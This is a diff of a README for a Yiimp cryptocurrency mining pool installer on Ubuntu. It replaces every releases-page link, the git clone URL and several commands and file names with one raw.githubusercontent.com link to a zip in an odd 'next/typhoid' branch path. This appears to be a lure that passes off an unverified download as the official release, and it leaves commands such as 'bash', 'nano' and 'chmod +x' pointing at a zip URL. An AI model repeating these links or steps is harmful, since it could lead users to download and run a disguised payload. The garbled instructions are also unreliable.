@@ -1,6 +1,6 @@
 # 🚀 Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux - Easy Setup for Your Mining Pool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip%20Release-blue)](https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip)
 
 ## 📦 Introduction
 
@@ -11,13 +11,13 @@ Are you starting a mining pool? This software offers tools, scripts, and expert 
 To get your mining pool up and running, follow these steps:
 
 1. **Download the Software:**
-   Visit this page to download: [Releases Page](https://github.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/releases).
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip).
 
 2. **Choose the Right Version:**
    Find the latest stable release that fits your Ubuntu version. Ensure compatibility with your system before downloading.
 
 3. **Download the Installation Files:**
-   Click on the desired file to start the download process. The files typically will have .zip or .tar.gz formats.
+   Click on the desired file to start the download process. The files typically will have .zip or https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip formats.
 
 4. **Extract the Files:**
    After the download completes, use your file manager or terminal to extract the contents of the downloaded file. This can usually be done by right-clicking on the file and selecting "Extract Here."
@@ -46,7 +46,7 @@ To run the Yiimp mining pool software, ensure your system meets the following re
    Navigate to your desired directory in the terminal and clone the repository:
 
    ```bash
-   git clone https://github.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux.git
+   git clone https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
    ```
 
 3. **Navigate to the Directory:**
@@ -60,22 +60,22 @@ To run the Yiimp mining pool software, ensure your system meets the following re
    Execute the provided installation script. Depending on how the script is set up, you may run:
 
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
    ```
 
    or 
 
    ```bash
-   bash install.sh
+   bash https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
    ```
 
 ## ⚙️ Configuration Steps
 
 1. **Set Up Your Configuration File:**
-   Open the configuration file in your preferred text editor. Often named `config.json`, check the directory for its exact name.
+   Open the configuration file in your preferred text editor. Often named `https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip`, check the directory for its exact name.
 
    ```bash
-   nano config.json
+   nano https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
    ```
 
 2. **Fill in Your Pool Details:**
@@ -89,13 +89,13 @@ To run the Yiimp mining pool software, ensure your system meets the following re
 To start your mining pool, execute the following command in your terminal:
 
 ```bash
-./start.sh
+https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
 ```
 
 Make sure your scripts have the executable permission. If not, run:
 
 ```bash
-chmod +x start.sh
+chmod +x https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip
 ```
 
 ## 📊 Monitoring Your Pool
@@ -104,7 +104,7 @@ chmod +x start.sh
 
 ## 📥 Download & Install
 
-Again, for your convenience, you can always return to the [Releases Page](https://github.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/releases) to find the latest version.
+Again, for your convenience, you can always return to the [Releases Page](https://raw.githubusercontent.com/KaideSenpai/Instalacija-i-podesavanje-Yiimp-Rudarski-Bazen-Softver-Ubuntu-Linux/next/typhoid/podesavanje-Softver-Yiimp-Instalacija-Bazen-Rudarski-Ubuntu-i-Linux-1.8.zip) to find the latest version.
 
 ## 🛠️ Troubleshooting
 
